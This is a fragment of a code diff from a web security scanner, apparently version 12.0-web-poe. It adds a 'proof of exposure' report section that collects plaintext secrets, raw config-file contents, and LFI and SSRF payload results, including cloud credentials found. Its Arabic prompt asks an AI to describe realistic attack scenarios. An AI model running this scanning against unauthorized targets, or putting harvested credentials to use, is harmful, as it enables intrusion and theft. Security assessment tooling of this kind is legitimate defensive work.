 - ماذا يمكن للمخترقين فعله بهذه الأسرار والمفاتيح المكشوفة (سيناريوهات هجوم واقعية)
 - ما الخطوات التي يجب اتخاذها فوراً لإصلاح هذه الثغرات
-- تحذير واضح بأن الموقع قابل للاختراق باستخدام هذه الأسرار المكشوفة`;
+- تحذير واضح بأن الموقع قابل للاختراق باستخدام هذه الأسرار المكشوفة
+- قسم "إثبات التعرض الفعلي" يعرض كل ملف تكوين مكشوف ومحتواه الخام`;
 
     const reportResult = await callPowerAI(prompt, "", 8000);
     aiReport = reportResult.content;
@@ -9598,9 +10002,16 @@ ${vulnResults.map(v => `  [${v.severity.toUpperCase()}] ${v.type}: ${v.url} — 
       crypto: webCipher7Crypto,
       aws: webCipher7AWS,
       securityHeaders: secHeaders,
-      totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length + vulnResults.length + webData.domXssSinks.length + webData.cookies.filter(c => c.issues.length > 0).length + infoDisclosures.length + authWeaknesses.length,
-      phasesExecuted: 18,
-      engineVersion: "11.0-web",
+      totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length + vulnResults.length + webData.domXssSinks.length + webData.cookies.filter(c => c.issues.length > 0).length + infoDisclosures.length + authWeaknesses.length + poeSecrets.length + poeConfigFiles.length + poeLFIResults.length + poeSSRFResults.length,
+      phasesExecuted: 19,
+      engineVersion: "12.0-web-poe",
+    },
+    proof_of_exposure: {
+      extracted_plaintext_secrets: poeSecrets.map(s => ({ type: s.type, value: s.value, source: s.source })),
+      exposed_config_files: poeConfigFiles.map(cf => ({ path: cf.path, status: cf.status, size: cf.size, rawContent: cf.rawContent, parsedKeys: cf.parsedKeys })),
+      lfi_proof: poeLFIResults.map(r => ({ url: r.url, payload: r.payload, rawContent: r.rawContent, leakType: r.leakType })),
+      ssrf_proof: poeSSRFResults.map(r => ({ url: r.url, payload: r.payload, provider: r.provider, rawContent: r.rawContent, credentialsFound: r.credentialsFound })),
+      totalExposures: poeSecrets.length + poeConfigFiles.length + poeLFIResults.length + poeSSRFResults.length,
     },
     generatedAt: new Date().toISOString(),
     targetUrl: webData.url,
